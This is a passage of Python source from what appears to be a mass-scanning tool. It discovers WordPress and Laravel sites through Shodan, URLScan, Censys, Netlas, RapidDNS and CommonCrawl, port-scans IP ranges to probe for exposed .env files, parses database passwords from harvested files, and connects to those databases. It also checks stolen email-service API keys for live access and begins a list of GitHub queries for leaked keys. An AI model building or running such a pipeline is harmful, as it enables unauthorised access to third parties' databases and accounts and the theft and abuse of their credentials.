                            print(f"[shodan] HTTP {resp.status} for {query!r}", flush=True)
                            break
                        data = await resp.json()
                        matches = data.get("matches", [])
                        if not matches:
                            break
                        for match in matches:
                            hostnames = match.get("hostnames", [])
                            ip = match.get("ip_str", "")
                            port = match.get("port")
                            host = hostnames[0] if hostnames else ip
                            if port and port not in (80, 443):
                                host = f"{host}:{port}"
                            if host and host not in seen:
                                seen.add(host)
                                total_yielded += 1
                                yield host
                        if len(matches) < 100:
                            break
                except Exception as e:
                    print(f"[shodan] Error: {e}", flush=True)
                    break
                await asyncio.sleep(1)  # stay within Shodan rate limit
            print(f"[shodan] {query!r} → {total_yielded} hosts", flush=True)
    finally:
        if own_pm:
            await pm.close()


# ── URLScan.io discovery ───────────────────────────────────────────────────────

async def run_urlscan_search(
    queries: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
    api_key: Optional[str] = None,
) -> AsyncIterator[str]:
    """Query URLScan.io for WordPress hosts. No API key required for public results.

    URLScan.io maintains a searchable database of scanned websites with
    technology detection. Querying page.tech:WordPress returns sites that
    were detected as running WordPress during automated or user-submitted scans.

    Pagination via search_after cursor — fetches up to 10 pages × 100 = 1000
    results per query (free, no auth). With an API key the size cap is higher.
    """
    if queries is None:
        queries = ["page.tech:WordPress"]

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()
    headers: dict = {"Content-Type": "application/json"}
    if api_key:
        headers["API-Key"] = api_key

    # URLScan.io free tier: ~10 req/min, page.body: and page.tech: require API key.
    # Use a longer inter-page delay without a key to avoid per-minute throttling.
    page_delay = 2.0 if not api_key else 0.5
    query_delay = 5.0 if not api_key else 1.0

    try:
        for query in queries:
            yielded = 0
            search_after: Optional[str] = None
            skip_query = False

            for _page in range(10):  # max 10 pages × 100 = 1000 per query (free)
                if skip_query:
                    break
                # sort=date:desc ensures most-recently-scanned sites come first,
                # so successive runs return fresh hosts rather than the same top-100.
                params = f"q={urllib.parse.quote(query)}&size=100&sort=date:desc"
                if search_after:
                    params += f"&search_after={urllib.parse.quote(search_after)}"
                url = f"https://urlscan.io/api/v1/search/?{params}"
                try:
                    async with pm.request(
                        "GET", url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=20),
                    ) as resp:
                        if resp.status == 429:
                            print("[urlscan] Rate limited — backing off 30s", flush=True)
                            await asyncio.sleep(30)
                            continue
                        if resp.status == 403:
                            # Field requires API key (page.body, page.tech without auth).
                            # Don't retry — skip this query entirely.
                            if not api_key:
                                print(f"[urlscan] {query!r} requires API key — skipping", flush=True)
                            else:
                                print(f"[urlscan] HTTP 403 on {query!r}", flush=True)
                            skip_query = True
                            break
                        if resp.status == 400:
                            print(f"[urlscan] Bad query {query!r}", flush=True)
                            skip_query = True
                            break
                        if resp.status != 200:
                            print(f"[urlscan] HTTP {resp.status} on {query!r}", flush=True)
                            break
                        data = await resp.json()
                        results = data.get("results", [])
                        if not results:
                            break
                        for r in results:
                            domain = (r.get("page") or {}).get("domain", "")
                            if domain and domain not in seen:
                                seen.add(domain)
                                yielded += 1
                                yield domain
                        # Advance cursor
                        search_after = data.get("pagination", {}).get("search_after")
                        if not search_after or len(results) < 100:
                            break
                except Exception as e:
                    print(f"[urlscan] Error: {e}", flush=True)
                    break
                await asyncio.sleep(page_delay)

            if not skip_query:
                print(f"[urlscan] {query!r} → {yielded} hosts", flush=True)
            await asyncio.sleep(query_delay)
    finally:
        if own_pm:
            await pm.close()


# ── RapidDNS reverse-IP discovery ─────────────────────────────────────────────
# Queries rapiddns.io for all domain names hosted on each /24 in the given IP
# ranges. Free, no auth. Returns up to 100 domains per /24 range query.

_RAPIDDNS_DOMAIN_RE = re.compile(r"<td>([a-zA-Z0-9._-]+\.[a-zA-Z]{2,})</td>")


async def run_rapiddns_discover(
    ip_ranges: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
) -> AsyncIterator[str]:
    """Query RapidDNS for domain names on each /24 in ip_ranges.

    RapidDNS is a free reverse-IP/DNS search engine. Querying it with a
    CIDR range returns the domain names that DNS points to IPs in that range.
    This converts raw IP ranges into scannable domain names — critical for
    shared hosting where WP sites only respond correctly to the right Host header.

    Free, no auth. Up to 100 domains per /24 request.
    Rate-limited: 1s delay between requests.
    """
    if not ip_ranges:
        return

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()

    # Expand all ranges to unique /24 subnets
    subnets_24: list[str] = []
    seen_24: set[str] = set()
    for raw in ip_ranges:
        raw = raw.strip()
        if not raw or raw.startswith("#"):
            continue
        try:
            # Handle bare IPs, /24s, /16s, etc.
            net = ipaddress.ip_network(raw, strict=False)
            if net.prefixlen <= 24:
                for subnet in net.subnets(new_prefix=24):
                    key = str(subnet)
                    if key not in seen_24:
                        seen_24.add(key)
                        subnets_24.append(str(subnet))
            else:
                # Smaller than /24 — use the parent /24
                parent = net.supernet(new_prefix=24)
                key = str(parent)
                if key not in seen_24:
                    seen_24.add(key)
                    subnets_24.append(key)
        except ValueError:
            pass

    print(f"[rapiddns] Querying {len(subnets_24)} /24 subnet(s) …", flush=True)
    total_yielded = 0

    try:
        for subnet in subnets_24:
            url = f"https://rapiddns.io/s/{subnet}?full=1"
            try:
                async with pm.request(
                    "GET", url,
                    headers={"User-Agent": random.choice(_USER_AGENTS)},
                    timeout=aiohttp.ClientTimeout(total=20),
                ) as resp:
                    if resp.status == 429:
                        print("[rapiddns] Rate limited — backing off 30s", flush=True)
                        await asyncio.sleep(30)
                        continue
                    if resp.status != 200:
                        continue
                    body = await resp.text()
                    for m in _RAPIDDNS_DOMAIN_RE.finditer(body):
                        host = m.group(1).lower()
                        if host and host not in seen and _domain_ok(host):
                            seen.add(host)
                            total_yielded += 1
                            yield host
            except Exception as e:
                print(f"[rapiddns] Error for {subnet}: {e}", flush=True)
            await asyncio.sleep(1.0)

        print(f"[rapiddns] Done — {total_yielded} domain(s) from {len(subnets_24)} subnet(s)", flush=True)
    finally:
        if own_pm:
            await pm.close()


# ── CommonCrawl CDX discovery ─────────────────────────────────────────────────
# Plugin paths to search for in CommonCrawl
_WP_PLUGIN_CDX_PATHS = [
    "wp-content/plugins/wp-file-manager/readme.txt",
    "wp-content/plugins/drag-and-drop-multiple-file-upload-contact-form-7/readme.txt",
    "wp-content/plugins/elementor/readme.txt",
    "wp-content/plugins/really-simple-ssl/readme.txt",
    "wp-content/plugins/litespeed-cache/readme.txt",
]

# Hardcoded recent index ID — updated quarterly. Used as fallback when the
# collinfo.json endpoint is unreachable.
_CC_FALLBACK_INDEX = "CC-MAIN-2026-17"


async def _get_commoncrawl_index(pm: ProxyManager) -> str:
    """Return the CDX API URL for the most recent CommonCrawl index.

    Uses HTTP (not HTTPS) — the HTTPS endpoint is unreachable from many
    cloud environments. Falls back to the hardcoded recent index on failure.
    """
    try:
        async with pm.request(
            "GET", "http://index.commoncrawl.org/collinfo.json",
            headers={"User-Agent": random.choice(_USER_AGENTS)},
            timeout=aiohttp.ClientTimeout(total=15),
        ) as resp:
            if resp.status == 200:
                indexes = await resp.json(content_type=None)
                if indexes:
                    api = indexes[0].get("cdx-api", "")
                    # Rewrite to HTTP so the same network policy applies
                    return api.replace("https://", "http://")
    except Exception:
        pass
    return f"http://index.commoncrawl.org/{_CC_FALLBACK_INDEX}-index"


async def run_commoncrawl_discover(
    proxy_mgr: Optional[ProxyManager] = None,
    limit_per_path: int = 3000,
) -> AsyncIterator[str]:
    """Query the CommonCrawl CDX index for domains that hosted vulnerable WP plugins.

    Free, no auth. Searches the most recent crawl index for pages matching
    each plugin's readme.txt path, extracting hostnames.
    """
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()
    try:
        cdx_api = await _get_commoncrawl_index(pm)
        print(f"[commoncrawl] Using index: {cdx_api}", flush=True)

        for path in _WP_PLUGIN_CDX_PATHS:
            # CommonCrawl CDX needs a TLD-wildcard prefix: *.tld/path
            # We query all TLDs by iterating the most common ones
            for tld_pattern in ("*.com", "*.net", "*.org", "*.co", "*.io"):
                url = (
                    f"{cdx_api}?url={tld_pattern}/{path}"
                    f"&output=json&fl=url&limit={limit_per_path}&collapse=urlkey"
                )
                try:
                    async with pm.request(
                        "GET", url,
                        headers={"User-Agent": random.choice(_USER_AGENTS)},
                        timeout=aiohttp.ClientTimeout(total=60),
                    ) as resp:
                        if resp.status != 200:
                            continue
                        text = await resp.text()
                        yielded = 0
                        for line in text.strip().splitlines():
                            try:
                                row = json.loads(line)
                                raw_url = row.get("url", "")
                                parsed = urllib.parse.urlparse(raw_url)
                                host = parsed.netloc.lower().split(":")[0]
                                if host and host not in seen and _domain_ok(host):
                                    seen.add(host)
                                    yielded += 1
                                    yield host
                            except Exception:
                                pass
                        if yielded:
                            slug = path.split("/")[3]
                            print(f"[commoncrawl] {slug} {tld_pattern} → {yielded} hosts", flush=True)
                except Exception as e:
                    print(f"[commoncrawl] Error for {path}: {e}", flush=True)
                await asyncio.sleep(1.5)
    finally:
        if own_pm:
            await pm.close()


# ── crt.sh subdomain enumeration ──────────────────────────────────────────────

_DOMAIN_RE = re.compile(r"^[a-zA-Z0-9-]+(?:\.[a-zA-Z0-9-]+)+$")


def _is_bare_domain(target: str) -> bool:
    """True if target looks like a domain (not IP, not CIDR, not URL)."""
    t = target.strip().split(":")[0]  # strip port
    if not _DOMAIN_RE.match(t):
        return False
    try:
        ipaddress.ip_address(t)
        return False  # it's an IP
    except ValueError:
        return True


async def run_crtsh_enum(
    domains: list[str],
    proxy_mgr: Optional[ProxyManager] = None,
) -> AsyncIterator[str]:
    """Query crt.sh CT logs for subdomains of each input domain.  Yields hosts.

    Free, no API key. Returns historical SSL certs containing the domain;
    we extract every name from the cert's Subject Alternative Names.
    """
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()
    try:
        for domain in domains:
            d = domain.strip().lower().lstrip("*.")
            url = f"https://crt.sh/?q=%25.{urllib.parse.quote(d)}&output=json"
            try:
                async with pm.request(
                    "GET", url,
                    headers={"User-Agent": random.choice(_USER_AGENTS)},
                    timeout=aiohttp.ClientTimeout(total=30),
                ) as resp:
                    if resp.status != 200:
                        print(f"[crtsh] HTTP {resp.status} for {d}", flush=True)
                        continue
                    # crt.sh sometimes returns invalid JSON when overloaded
                    try:
                        entries = await resp.json(content_type=None)
                    except Exception:
                        print(f"[crtsh] Bad JSON for {d}", flush=True)
                        continue
                    yielded = 0
                    for entry in entries:
                        name_value = entry.get("name_value", "")
                        for name in name_value.split("\n"):
                            n = name.strip().lower().lstrip("*.")
                            if not n or "*" in n or n in seen:
                                continue
                            if not _DOMAIN_RE.match(n):
                                continue
                            # Only yield names that fall under the input domain
                            if not (n == d or n.endswith("." + d)):
                                continue
                            seen.add(n)
                            yielded += 1
                            yield n
                    print(f"[crtsh] {d} → {yielded} unique subdomain(s)", flush=True)
            except Exception as e:
                print(f"[crtsh] Error for {d}: {e}", flush=True)
    finally:
        if own_pm:
            await pm.close()


# ── censys discovery ──────────────────────────────────────────────────────────

async def run_censys_search(
    api_id: str,
    api_secret: str,
    queries: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
) -> AsyncIterator[str]:
    """Query Censys hosts API for Laravel installs. Yields hostnames or IPs."""
    if queries is None:
        queries = ["services.software.product: laravel"]

    auth = base64.b64encode(f"{api_id}:{api_secret}".encode()).decode()
    headers = {"Authorization": f"Basic {auth}", "Accept": "application/json"}
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()
    forbidden_count = 0  # 403 = query needs higher Censys plan tier (e.g. body indexing)

    print(f"[censys] Auth: API ID {api_id[:6]}…", flush=True)
    try:
        for query in queries:
            yielded = 0
            cursor = ""
            for _ in range(10):  # max 10 pages × 100 = 1000 hosts per query
                url = (
                    "https://search.censys.io/api/v2/hosts/search"
                    f"?q={urllib.parse.quote(query)}&per_page=100"
                )
                if cursor:
                    url += f"&cursor={urllib.parse.quote(cursor)}"
                try:
                    async with pm.request(
                        "GET", url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=20),
                    ) as resp:
                        if resp.status == 401:
                            print("[censys] Invalid credentials — aborting", flush=True)
                            return
                        if resp.status == 403:
                            # Plan-tier limitation — body/header indexing is a
                            # paid feature. Don't burn retries on this query.
                            forbidden_count += 1
                            print(
                                f"[censys] 403 Forbidden for {query!r} — "
                                "your plan likely doesn't include this field "
                                "(body/headers indexing requires the Data tier)",
                                flush=True,
                            )
                            break
                        if resp.status == 429:
                            print(f"[censys] 429 rate limited on {query!r} — backing off", flush=True)
                            await asyncio.sleep(5)
                            continue
                        if resp.status != 200:
                            err_text = (await resp.text())[:200]
                            print(
                                f"[censys] HTTP {resp.status} for {query!r}: {err_text}",
                                flush=True,
                            )
                            break
                        body = await resp.json()
                        result = body.get("result", {})
                        for hit in result.get("hits", []):
                            ip = hit.get("ip", "")
                            names = hit.get("dns", {}).get("names", [])
                            host = names[0] if names else ip
                            if host and host not in seen:
                                seen.add(host)
                                yielded += 1
                                yield host
                        cursor = result.get("links", {}).get("next", "")
                        if not cursor:
                            break
                except Exception as e:
                    print(f"[censys] Error: {e}", flush=True)
                    break
                await asyncio.sleep(1)
            print(f"[censys] {query!r} → {yielded} hosts", flush=True)

        if forbidden_count == len(queries):
            print(
                "[censys] ⚠ ALL queries returned 403 — your Censys plan tier doesn't "
                "support these fields. Edit config.yaml censys_queries to use only "
                "fields available on your plan (e.g. services.software.product).",
                flush=True,
            )
        elif forbidden_count:
            print(
                f"[censys] ⚠ {forbidden_count}/{len(queries)} queries blocked by plan tier — "
                "remaining queries returned data. See config.yaml to trim.",
                flush=True,
            )
    finally:
        if own_pm:
            await pm.close()


async def run_netlas_search(
    api_key: str,
    queries: Optional[list[str]] = None,
    proxy_mgr: Optional[ProxyManager] = None,
    ip_filters: Optional[list[str]] = None,
) -> AsyncIterator[str]:
    """Query Netlas.io for web hosts matching Laravel fingerprints.

    Netlas indexes HTTP responses globally and lets you search by body,
    headers, title, and cookies.  A free tier is available (no credit card).

    ip_filters: list of CIDR strings (e.g. ["165.227.0.0/16"]).  When
    provided, each query gains an AND ip:CIDR clause so only hosts inside
    those ranges are returned — critical for focused CIDR/ASN sweeps where
    global results would be noise.
    """
    if queries is None:
        queries = ['http.body:"laravel_session"']

    headers = {"X-API-Key": api_key, "Accept": "application/json"}
    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    seen: set[str] = set()

    # Build IP-range clause once — cap at 8 CIDRs to keep URLs manageable.
    # Netlas Lucene syntax: ip:1.2.3.0/24  (no quotes — slash is literal here)
    ip_clause = ""
    if ip_filters:
        kept = ip_filters[:8]
        parts = " OR ".join(f"ip:{c}" for c in kept)
        ip_clause = f" AND ({parts})"
        print(f"[netlas] IP filter: {', '.join(kept)}", flush=True)

    try:
        ip_filter_active = bool(ip_clause)
        for query in queries:
            effective_query = query + ip_clause
            yielded = 0
            total_available = None
            page = 0
            while page < 20:  # max 20 pages × 200 = 4,000 per query
                start = page * 200
                url = (
                    "https://app.netlas.io/api/responses/"
                    f"?q={urllib.parse.quote(effective_query)}"
                    f"&start={start}&count=200"
                )
                advance = True  # set False to retry the same page
                try:
                    async with pm.request(
                        "GET", url, headers=headers,
                        timeout=aiohttp.ClientTimeout(total=30),
                    ) as resp:
                        if resp.status == 401:
                            print("[netlas] Invalid API key — aborting", flush=True)
                            return
                        if resp.status == 403:
                            print(
                                "[netlas] 403 Forbidden — plan does not allow these "
                                "queries. Skipping all remaining Netlas lookups.",
                                flush=True,
                            )
                            return  # 403 is account-level; no point trying more queries
                        if resp.status == 429:
                            print("[netlas] 429 rate limited — backing off 10s", flush=True)
                            await asyncio.sleep(10)
                            advance = False  # retry same page after backoff
                        elif resp.status == 500 and ip_filter_active and page == 0:
                            # CIDR notation in ip: not supported — fall back to global
                            # and retry THIS page (page 0) with the unfiltered query.
                            print(
                                "[netlas] IP range filter not supported — "
                                "falling back to global queries (results from all IPs)",
                                flush=True,
                            )
                            ip_clause = ""
                            ip_filter_active = False
                            effective_query = query
                            advance = False  # retry page 0 with new query
                        elif resp.status != 200:
                            err = (await resp.text())[:200]
                            print(f"[netlas] HTTP {resp.status} for {query!r}: {err}", flush=True)
                            break
                        else:
                            body = await resp.json(content_type=None)
                            if not isinstance(body, dict):
                                print(
                                    f"[netlas] Unexpected response for {query!r}: {str(body)[:200]}",
                                    flush=True,
                                )
                                break
                            if page == 0:
                                total_available = body.get("count", body.get("total", "?"))
                            items = body.get("items", [])
                            if not items:
                                break
                            for item in items:
                                if not isinstance(item, dict):
                                    continue
                                data = item.get("data", {})
                                if not isinstance(data, dict):
                                    continue
                                uri = data.get("uri", {})
                                if not isinstance(uri, dict):
                                    uri = {}
                                ip = data.get("ip", "")
                                host = uri.get("host") or ip
                                port = uri.get("port")
                                if port and port not in (80, 443):
                                    host = f"{host}:{port}"
                                if host and host not in seen:
                                    seen.add(host)
                                    yielded += 1
                                    yield host
                            if len(items) < 200:
                                break
                except Exception as e:
                    print(f"[netlas] Error on {query!r} page {page}: {e}", flush=True)
                    break
                if advance:
                    page += 1
                    await asyncio.sleep(1)
            suffix = f" (of {total_available} in index)" if total_available not in (None, "?", yielded) else ""
            print(f"[netlas] {query!r} → {yielded} hosts{suffix}", flush=True)
    finally:
        if own_pm:
            await pm.close()


# ── reverse DNS ───────────────────────────────────────────────────────────────

async def resolve_ptr_records(ips: list[str], concurrency: int = 32) -> list[str]:
    """Resolve PTR records for each IP. Returns list of (ip OR resolved hostname).

    Uses the stdlib resolver via run_in_executor — keeps deps minimal.
    Failed lookups fall through as the original IP unchanged.
    Hard-capped at 50 000 IPs; larger sets are returned unchanged with a
    warning — PTR lookup on millions of IPs takes hours and rarely helps.
    """
    if not ips:
        return []

    PTR_CAP = 50_000
    if len(ips) > PTR_CAP:
        print(
            f"[ptr] Skipping PTR lookup — {len(ips):,} IPs exceeds cap of {PTR_CAP:,}. "
            "Disable 'Resolve PTR records' when scanning large ASN/CIDR ranges.",
            flush=True,
        )
        return list(ips)

    loop = asyncio.get_running_loop()
    sem = asyncio.Semaphore(concurrency)

    async def lookup(ip: str) -> str:
        async with sem:
            try:
                hostname, *_ = await loop.run_in_executor(
                    None, socket.gethostbyaddr, ip
                )
                return hostname
            except Exception:
                return ip

    # Process in fixed-size chunks so we never pre-create millions of Task
    # objects — each chunk is fully awaited before the next is started.
    chunk_size = concurrency * 8
    results: list[str] = []
    for i in range(0, len(ips), chunk_size):
        chunk = ips[i : i + chunk_size]
        results.extend(await asyncio.gather(*[lookup(ip) for ip in chunk]))

    resolved = sum(1 for ip, r in zip(ips, results) if r != ip)
    if resolved:
        print(f"[ptr] {resolved}/{len(ips):,} IP(s) resolved to hostnames", flush=True)
    return results


# ── TCP pre-filter ────────────────────────────────────────────────────────────

async def tcp_prefilter(
    hosts: list[str],
    ports: tuple[int, ...] = (80, 443, 8080, 8000, 8888, 3000),
    timeout: float = 1.0,
    concurrency: int = 200,
) -> list[str]:
    """Return hosts that have at least one TCP port open.

    Non-IP targets (domain names) pass through unchanged — a resolvable
    hostname already implies a reachable server.  For raw IP sweeps this
    eliminates dark addresses before queuing HTTP probes per host.

    Port handling:
    - Standard ports (80, 443): host returned as bare IP — probe tries
      both http:// and https:// automatically.
    - Non-standard ports (8080, 8000, …): returned as IP:port — probe
      URL becomes http://1.2.3.4:8080/.env so the right port is hit.
    - If BOTH standard and non-standard ports are open, the host appears
      twice: once bare and once with the port suffix.

    Uses a worker-pool pattern (queue + N consumers) so memory stays
    bounded at O(concurrency) tasks even for /16 sweeps.
    """
    _STANDARD_PORTS = frozenset((80, 443))

    ip_hosts = [h for h in hosts if _is_ip(h)]
    non_ip_hosts = [h for h in hosts if not _is_ip(h)]
    if not ip_hosts:
        return hosts

    port_str = "/".join(str(p) for p in ports)
    print(
        f"[prefilter] TCP port-scan {len(ip_hosts):,} IP(s) "
        f"(ports {port_str}, timeout {timeout:.1f}s, concurrency {concurrency}) …",
        flush=True,
    )
    t0 = asyncio.get_event_loop().time()
    survivors: list[str] = []
    queue: asyncio.Queue = asyncio.Queue(maxsize=concurrency * 2)
    checked = 0
    total = len(ip_hosts)

    standard_ports = [p for p in ports if p in _STANDARD_PORTS]
    non_standard_ports = [p for p in ports if p not in _STANDARD_PORTS]

    async def _try_port(bare: str, port: int) -> Optional[int]:
        try:
            _, writer = await asyncio.wait_for(
                asyncio.open_connection(bare, port), timeout=timeout
            )
            writer.close()
            try:
                await asyncio.wait_for(writer.wait_closed(), timeout=0.3)
            except Exception:
                pass
            return port
        except Exception:
            return None

    async def _check_one(host: str) -> list[str]:
        """Return list of probe targets for this host (empty = dark).

        Two-round design: standard ports first in parallel; if any opens we
        return immediately and skip non-standard checks. Caps wall-clock per
        host at 2× timeout (1 round for standard, 1 for non-standard) instead
        of len(ports) × timeout sequentially.
        """
        if host.startswith("["):
            bare = host[1 : host.index("]")]
        elif ":" in host:
            bare = host.rsplit(":", 1)[0]
        else:
            bare = host

        if standard_ports:
            r = await asyncio.gather(*[_try_port(bare, p) for p in standard_ports])
            if any(p is not None for p in r):
                return [host]  # bare IP — probe tries http:// and https://

        if non_standard_ports:
            r = await asyncio.gather(*[_try_port(bare, p) for p in non_standard_ports])
            return [f"{bare}:{p}" for p in r if p is not None]

        return []

    async def _worker() -> None:
        nonlocal checked
        while True:
            host = await queue.get()
            if host is None:
                queue.task_done()
                break
            try:
                results = await _check_one(host)
            except Exception:
                results = []
            checked += 1
            survivors.extend(results)
            if checked % 10_000 == 0:
                print(
                    f"[prefilter] {checked:,}/{total:,} scanned"
                    f" — {len(survivors):,} open …",
                    flush=True,
                )
            queue.task_done()

    workers = [asyncio.create_task(_worker()) for _ in range(concurrency)]

    try:
        for host in ip_hosts:
            await queue.put(host)
        for _ in range(concurrency):
            await queue.put(None)
        await asyncio.gather(*workers)
    finally:
        for w in workers:
            if not w.done():
                w.cancel()

    elapsed = asyncio.get_event_loop().time() - t0
    unique_ips = len({s.split(":")[0] for s in survivors})
    pct = unique_ips * 100 // total if total else 0
    print(
        f"[prefilter] Done in {elapsed:.0f}s — "
        f"{unique_ips:,}/{total:,} IPs have web ports open ({pct}%), "
        f"{total - unique_ips:,} dark hosts eliminated, "
        f"{len(survivors):,} probe target(s) total",
        flush=True,
    )
    return non_ip_hosts + survivors


# ── live key verification ─────────────────────────────────────────────────────

# Verifiers return Optional[bool]:
#   True  → live (HTTP 200)
#   False → dead (HTTP 401/403 — auth definitively rejected)
#   None  → unknown (timeout, 429 rate-limit, 5xx, network error). The DB row
#           is left as NULL so a later run can retry. Critical: 429 from a
#           busy run must NOT mark valid keys as dead.
def _classify(status: int) -> Optional[bool]:
    if status == 200:
        return True
    if status in (401, 403):
        return False
    return None


async def _verify_resend(pm: ProxyManager, key: str) -> Optional[bool]:
    try:
        async with pm.request(
            "GET",
            "https://api.resend.com/domains",
            headers={"Authorization": f"Bearer {key}"},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            return _classify(r.status)
    except Exception:
        return None


async def _verify_sendgrid(pm: ProxyManager, key: str) -> Optional[bool]:
    try:
        async with pm.request(
            "GET",
            "https://api.sendgrid.com/v3/scopes",
            headers={"Authorization": f"Bearer {key}"},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            return _classify(r.status)
    except Exception:
        return None


async def _verify_mailgun(pm: ProxyManager, key: str) -> Optional[bool]:
    try:
        auth = base64.b64encode(f"api:{key}".encode()).decode()
        async with pm.request(
            "GET",
            "https://api.mailgun.net/v4/domains",
            headers={"Authorization": f"Basic {auth}"},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            return _classify(r.status)
    except Exception:
        return None


async def _verify_brevo(pm: ProxyManager, key: str) -> Optional[bool]:
    try:
        async with pm.request(
            "GET",
            "https://api.brevo.com/v3/account",
            headers={"api-key": key},
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            return _classify(r.status)
    except Exception:
        return None


async def _verify_postmark(pm: ProxyManager, token: str) -> Optional[bool]:
    try:
        async with pm.request(
            "GET",
            "https://api.postmarkapp.com/server",
            headers={
                "Accept": "application/json",
                "X-Postmark-Server-Token": token,
            },
            timeout=aiohttp.ClientTimeout(total=10),
        ) as r:
            return _classify(r.status)
    except Exception:
        return None


def _parse_db_creds_from_env(raw: str) -> Optional[dict]:
    """Extract individual DB fields from a raw .env body."""
    host = _env_val(raw, "DB_HOST", "DATABASE_HOST", "PGHOST", "MYSQL_HOST") or "127.0.0.1"
    port_str = _env_val(raw, "DB_PORT", "DATABASE_PORT", "PGPORT", "MYSQL_PORT") or ""
    user = _env_val(raw, "DB_USERNAME", "DB_USER", "DATABASE_USER", "PGUSER", "MYSQL_USER") or "root"
    pw   = _env_val(raw, "DB_PASSWORD", "DB_PASS", "DATABASE_PASSWORD",
                    "DATABASE_PASS", "PGPASSWORD", "MYSQL_PASSWORD", "MYSQL_PASS") or ""
    name = _env_val(raw, "DB_DATABASE", "DB_NAME", "DATABASE_NAME",
                    "PGDATABASE", "MYSQL_DATABASE") or ""
    conn_str = _env_val(raw, "DB_CONNECTION", "DB_DRIVER") or ""
    if not pw or _is_placeholder_value(pw):
        return None
    driver = "pgsql" if ("pgsql" in conn_str or "postgres" in conn_str) else "mysql"
    try:
        port = int(port_str) if port_str else (5432 if driver == "pgsql" else 3306)
    except ValueError:
        port = 5432 if driver == "pgsql" else 3306
    return {"host": host, "port": port, "user": user, "password": pw,
            "database": name, "driver": driver}


async def _verify_db(_pm: ProxyManager, raw_key: str, *, raw_context: str = "") -> Optional[bool]:
    """Try a TCP + auth handshake to the discovered database.

    Returns True  = credentials accepted (live)
            False = connection reached but auth/access denied
            None  = host unreachable / timeout (transient, retry later)
    """
    creds = _parse_db_creds_from_env(raw_context) if raw_context else None
    if creds is None:
        return None

    loop = asyncio.get_event_loop()

    if creds["driver"] == "pgsql":
        if _asyncpg is None:
            return None
        try:
            conn = await asyncio.wait_for(
                _asyncpg.connect(
                    host=creds["host"], port=creds["port"],
                    user=creds["user"], password=creds["password"],
                    database=creds["database"] or "postgres",
                    timeout=8,
                ),
                timeout=10,
            )
            await conn.close()
            return True
        except Exception as exc:
            msg = str(exc).lower()
            if any(k in msg for k in ("password authentication", "role", "access denied",
                                       "permission denied", "database", "no pg_hba")):
                return False
            return None

    else:  # mysql
        if _aiomysql is None:
            return None
        try:
            conn = await asyncio.wait_for(
                _aiomysql.connect(
                    host=creds["host"], port=creds["port"],
                    user=creds["user"], password=creds["password"],
                    db=creds["database"] or "",
                    connect_timeout=8,
                    autocommit=True,
                ),
                timeout=10,
            )
            conn.close()
            return True
        except Exception as exc:
            msg = str(exc).lower()
            if any(k in msg for k in ("access denied", "password", "unknown database",
                                       "user", "host.*not allowed")):
                return False
            return None


_VERIFIERS = {
    "resend":   _verify_resend,
    "sendgrid": _verify_sendgrid,
    "mailgun":  _verify_mailgun,
    "brevo":    _verify_brevo,
    "postmark": _verify_postmark,
    "db":       _verify_db,
}


async def verify_findings_live(
    conn: sqlite3.Connection,
    proxy_mgr: Optional[ProxyManager] = None,
) -> tuple[int, int, int]:
    """Verify every unverified finding by calling its vendor's read-only API.

    Updates findings.verified to 1 (live) or 0 (dead). Returns
    (live, dead, skipped). Rows with transient errors (timeout, 429, 5xx,
    network failure) are left NULL so a future run can retry — this prevents
    a busy proxy or rate-limited vendor API from marking valid keys as dead.
    """
    rows = conn.execute(
        "SELECT id, vendor, resend_key, raw_context FROM findings "
        "WHERE verified IS NULL AND vendor IN "
        "('resend','sendgrid','mailgun','brevo','postmark','db')"
    ).fetchall()
    if not rows:
        return 0, 0, 0

    own_pm = proxy_mgr is None
    pm = proxy_mgr or ProxyManager()
    print(f"[verify] Checking {len(rows)} key(s) against vendor APIs …", flush=True)
    live = dead = skipped = 0
    sem = asyncio.Semaphore(10)

    async def check(row) -> None:
        nonlocal live, dead, skipped
        verifier = _VERIFIERS.get(row["vendor"])
        if not verifier:
            return
        async with sem:
            if row["vendor"] == "db":
                result = await verifier(pm, row["resend_key"],
                                        raw_context=row["raw_context"] or "")
            else:
                result = await verifier(pm, row["resend_key"])
        if result is None:
            # Transient — leave verified as NULL for retry on next run.
            skipped += 1
            return
        conn.execute(
            "UPDATE findings SET verified = ? WHERE id = ?",
            (1 if result else 0, row["id"]),
        )
        conn.commit()
        if result:
            live += 1
            print(f"[verify]   ✓ live  [{row['vendor']}] {_redact(row['resend_key'])}", flush=True)
        else:
            dead += 1

    try:
        await asyncio.gather(*[check(r) for r in rows])
    finally:
        if own_pm:
            await pm.close()

    summary = f"[verify] {live} live, {dead} dead/invalid"
    if skipped:
        summary += f", {skipped} unknown (transient — will retry)"
    print(summary, flush=True)
    return live, dead, skipped


# ── GitHub secret scanning ─────────────────────────────────────────────────────

_GITHUB_API = "https://api.github.com"

_GITHUB_QUERIES = [
    # ── Resend — by key format (catches any variable name) ──────────────────
    '"re_" filename:.env',           # re_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
    '"re_" extension:env',
    '"re_" filename:.env.example',
    # by common variable names
    "RESEND_API_KEY filename:.env",
    "RESEND_KEY filename:.env",
    "MAIL_API_KEY resend filename:.env",

    # ── SendGrid — by key format ─────────────────────────────────────────────
    '"SG." filename:.env',           # SG.xxxx.xxxx
    '"SG." extension:env',
    '"SG." filename:.env.example',
    # by variable name variants
    "SENDGRID_API_KEY filename:.env",
    "SENDGRID_KEY filename:.env",
    "SG_API_KEY filename:.env",

    # ── AWS SES — by key format ──────────────────────────────────────────────
    '"AKIA" filename:.env',          # AKIA… (20 chars, starts with AKIA)
    '"AKIA" extension:env',
    # by variable name variants
